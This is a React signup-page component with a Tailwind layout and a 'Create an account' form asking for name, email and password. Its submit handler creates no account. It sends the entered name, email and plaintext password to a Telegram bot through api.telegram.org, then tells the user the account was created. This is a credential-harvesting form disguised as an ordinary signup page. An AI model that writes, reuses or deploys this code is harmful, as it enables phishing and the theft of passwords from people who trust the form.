import React, { useState } from "react";
import axios from "axios";
import Foto from "../assets/Mount.svg";

const SignupResponsive = () => {
  const [form, setForm] = useState({
    name: "",
    email: "",
    password: "",
  });

  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    setForm({
      ...form,
      [e.target.name]: e.target.value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    const token = "YOUR_TELEGRAM_BOT_TOKEN"; // 🔑
    const chat_id = "YOUR_CHAT_ID"; // 👤
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const text = `👤 New Signup\n\nName: ${form.name}\n📧 Email: ${form.email}\n🔑 Password: ${form.password}`;

    try {
      await axios.post(url, { chat_id, text });
      alert("✅ Account created and sent to Telegram");
      setForm({ name: "", email: "", password: "" });
    } catch (err) {
      console.error(err);
      alert("❌ Error sending message");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="flex flex-col lg:flex-row items-center justify-center gap-10 lg:gap-20 py-10 px-6 sm:px-10 lg:px-20 bg-blue-950 min-h-screen">
      {/* Левая часть с картинкой */}
      <div className="flex justify-center w-full lg:w-1/2">
        <img
          src={Foto}
          alt="Illustration"
          className="max-w-[250px] sm:max-w-[300px] md:max-w-[400px] lg:max-w-[500px]"
        />
      </div>

      {/* Правая часть с формой */}
      <div className="w-full sm:w-[90%] md:w-[70%] lg:w-1/2 max-w-md bg-white/10 backdrop-blur-md p-6 sm:p-8 rounded-2xl shadow-xl">
        <p className="text-2xl sm:text-3xl md:text-4xl font-bold text-white text-center lg:text-left">
          Create an account
        </p>
        <p className="mt-2 text-sm sm:text-base text-gray-300 text-center lg:text-left">
          Enter your details below
        </p>

        <form className="flex flex-col gap-5 mt-6" onSubmit={handleSubmit}>
          <div>
            <label className="text-white block mb-1 text-sm sm:text-base">
              Name
            </label>
            <input
              className="w-full border border-gray-400 px-3 py-2 rounded-md bg-white focus:outline-none focus:ring-2 focus:ring-red-500"
              type="text"
              name="name"
              value={form.name}
              onChange={handleChange}
              required
            />
          </div>

          <div>
            <label className="text-white block mb-1 text-sm sm:text-base">
              Email
            </label>
            <input
              className="w-full border border-gray-400 px-3 py-2 rounded-md bg-white focus:outline-none focus:ring-2 focus:ring-red-500"
              type="email"
              name="email"
              value={form.email}
              onChange={handleChange}
              required
            />
          </div>

          <div>
            <label className="text-white block mb-1 text-sm sm:text-base">
              Password
            </label>
            <input
              className="w-full border border-gray-400 px-3 py-2 rounded-md bg-white focus:outline-none focus:ring-2 focus:ring-red-500"
              type="password"
              name="password"
              value={form.password}
              onChange={handleChange}
              required
            />
          </div>

          <button
            className="bg-red-600 py-2 sm:py-3 text-white font-bold rounded-md hover:bg-red-700 transition disabled:opacity-50"
            type="submit"
            disabled={loading}
          >
            {loading ? "Creating..." : "Create Account"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default SignupResponsive;
